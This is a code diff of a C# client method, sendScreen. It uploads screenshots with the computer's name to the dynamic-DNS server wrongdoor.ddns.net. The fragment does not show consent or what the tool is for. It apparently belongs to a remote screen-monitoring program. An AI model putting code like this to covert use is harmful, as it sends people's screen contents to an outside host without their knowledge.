@@ -1,9 +1,11 @@
 ﻿using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -44,17 +46,25 @@ namespace API
         /// </summary>
         /// <param name="screenshot"></param>
         /// <returns></returns>
-        public async Task sendScreen(string screenshot)
+        public async Task sendScreen(MemoryStream ms)
         {
             HttpClient client = new HttpClient();
-            FormUrlEncodedContent content = new FormUrlEncodedContent(
-                    new Dictionary<string, string>
-                        {
-                            { "screenshot", screenshot },
-                            { "computername", computername },
-                        }
-                );
-            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", content);
+            client.BaseAddress = new Uri("http://wrongdoor.ddns.net/");
+            MultipartFormDataContent form = new MultipartFormDataContent();
+            form.Add(new StringContent(computername), "computername");
+            form.Add(new ByteArrayContent(ms.GetBuffer(),0, ms.GetBuffer().Length), "screenshot", "screenshot.jpg");
+            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", form);
+
+
+            /*HttpClient client = new HttpClient();
+            Dictionary<string, string> postdata = new Dictionary<string, string>
+            {
+                { "screenshot", screenshot },
+                { "computername", computername },
+            };
+            var stringPayload = JsonConvert.SerializeObject(postdata);
+            var content = new StringContent(stringPayload, Encoding.UTF8, "application/json");
+            await client.PostAsync("http://wrongdoor.ddns.net/rooms/sendScreen.php", content);*/
         }
 
 
